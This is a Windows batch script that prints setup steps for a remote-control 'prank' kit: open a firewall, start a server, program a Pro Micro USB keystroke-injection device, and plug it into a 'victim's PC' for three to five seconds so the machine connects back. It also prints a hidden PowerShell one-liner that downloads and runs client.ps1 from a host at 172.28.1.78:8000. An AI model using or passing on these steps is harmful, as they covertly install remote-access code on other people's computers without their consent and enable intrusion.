@echo off
color 0E
cls
echo.
echo ================================================
echo   REMOTE CONTROL - QUICK START
echo ================================================
echo.
echo Step 1: Setup Firewall (ONE TIME ONLY)
echo        Right-click: 1_SETUP_FIREWALL.bat
echo        Select: "Run as administrator"
echo.
echo Step 2: Start Server
echo        RECOMMENDED: 2_START_SERVER_GITHUB.bat (uses GitHub)
echo        Alternative: 2_START_SERVERS.bat (local web server)
echo.
echo Step 3: Program Pro Micro
echo        Arduino IDE -^> Open ProMicro_Payload.ino
echo        Update IP (line 18): 172.28.1.78
echo        Upload to Pro Micro
echo.
echo Step 4: Execute Prank
echo        Plug Pro Micro into victim's PC
echo        Wait 3-5 seconds
echo        Remove Pro Micro
echo        Check GUI for connection!
echo.
echo ================================================
echo   MANUAL TEST (NO PRO MICRO)
echo ================================================
echo.
echo Press Win+R and paste this:
echo.
echo powershell -W Hidden -NoP -C "IEX(New-Object Net.WebClient).DownloadString('http://172.28.1.78:8000/client.ps1')"
echo.
echo ================================================
echo.
echo Current Files:
echo   1_SETUP_FIREWALL.bat  ^<-- Run as Admin (once)
echo   2_START_SERVERS.bat   ^<-- Start servers
echo   ProMicro_Payload.ino  ^<-- Upload to Pro Micro
echo   TEST_COMMAND.ps1      ^<-- Test commands
echo.
echo ================================================
echo.
pause
